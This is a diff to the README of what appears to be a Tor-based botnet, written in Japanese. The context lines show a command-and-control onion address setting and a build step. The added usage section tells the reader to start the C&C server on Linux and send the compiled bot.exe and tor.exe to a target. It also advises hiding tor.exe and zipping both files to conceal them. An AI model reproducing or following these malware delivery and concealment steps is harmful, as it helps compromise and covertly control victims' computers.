@@ -50,3 +50,11 @@ $ sudo cat /var/lib/tor/hidden_service/hostname
 #define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"
 ```
 終わったらbuild.batを実行してコンパイル終了です。
+
+## 使い方
+必ず最初にLinuxでcnc.outを実行してください。
+```
+$ ./cnc.out
+```
+そしたら、コンパイルしたbot.exeとtor.exeを同時にターゲットに送信してください。<br>
+そのときにtor.exeを隠しファイルに設定してzipファイルにして送るといいことがあります。
